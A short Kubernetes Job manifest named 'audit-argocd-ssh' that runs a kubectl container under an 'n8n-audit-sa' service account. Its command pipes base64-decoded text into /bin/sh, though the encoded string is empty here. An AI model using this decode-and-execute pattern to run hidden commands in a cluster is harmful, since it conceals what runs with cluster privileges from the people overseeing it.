apiVersion: batch/v1
kind: Job
metadata:
  name: audit-argocd-ssh
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command:
        - /bin/sh
        - -c
        - "echo  | base64 -d | /bin/sh"
